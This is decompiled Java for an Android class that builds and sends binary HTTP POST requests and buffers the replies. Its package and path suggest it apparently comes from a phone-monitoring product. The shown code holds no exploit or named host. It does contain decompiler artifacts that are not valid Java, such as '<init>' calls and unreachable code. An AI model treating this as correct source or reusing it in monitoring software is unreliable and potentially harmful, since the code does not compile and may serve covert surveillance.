package com.vvt.phoenix.prot;

import android.os.ConditionVariable;
import android.os.Looper;
import com.vvt.http.d;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.MethodType;
import java.io.ByteArrayOutputStream;

class k
  extends Thread
  implements d
{
  private k(i parami) {}
  
  public void a(int paramInt, Exception paramException)
  {
    i.a(this.a, false);
    i locali = this.a;
    Object[] arrayOfObject = new Object[2];
    Integer localInteger = Integer.valueOf(paramInt);
    arrayOfObject[0] = localInteger;
    String str1 = paramException.getMessage();
    arrayOfObject[1] = str1;
    String str2 = String.format("HTTP Code %d, Error Message: %s", arrayOfObject);
    i.a(locali, str2);
    i.e(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void a(com.vvt.http.a.a parama)
  {
    Object localObject1 = parama.a().d();
    Object localObject2 = parama.b();
    if (localObject1 != localObject2)
    {
      i.a(this.a, false);
      localObject1 = this.a;
      localObject2 = "Response MIME type doesn't matched with the request";
      i.a((i)localObject1, (String)localObject2);
      i.e(this.a).open();
      localObject1 = Looper.myLooper();
      ((Looper)localObject1).quit();
    }
    for (;;)
    {
      return;
      localObject1 = parama.d();
      localObject2 = i.f(this.a);
      int i = localObject1.length;
      ((ByteArrayOutputStream)localObject2).write((byte[])localObject1, 0, i);
    }
  }
  
  public void a(com.vvt.http.a.b paramb) {}
  
  public void a(Exception paramException)
  {
    i.a(this.a, false);
    i locali = this.a;
    String str = paramException.getMessage();
    i.a(locali, str);
    i.e(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void b(com.vvt.http.a.a parama)
  {
    i.a(this.a, true);
    i.e(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void b(Exception paramException)
  {
    i.a(this.a, false);
    i locali = this.a;
    String str = paramException.getMessage();
    i.a(locali, str);
    i.e(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void run()
  {
    Looper.prepare();
    com.vvt.http.request.b localb = new com/vvt/http/request/b;
    localb.<init>();
    Object localObject1 = i.a(this.a);
    localb.a((byte[])localObject1);
    localb.a(120000);
    localObject1 = ContentType.BINARY_OCTET_STREAM;
    localb.a((ContentType)localObject1);
    localObject1 = MethodType.POST;
    localb.a((MethodType)localObject1);
    localObject1 = i.b(this.a);
    localb.b((String)localObject1);
    localObject1 = i.c(this.a).d().e();
    Object localObject2 = com.vvt.phoenix.a.c.a(i.c(this.a).d().c());
    localb.c((String)localObject1);
    localb.d((String)localObject2);
    localObject1 = this.a;
    localObject2 = new java/io/ByteArrayOutputStream;
    ((ByteArrayOutputStream)localObject2).<init>();
    i.a((i)localObject1, (ByteArrayOutputStream)localObject2);
    i.d(this.a).a(localb, this);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/k.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */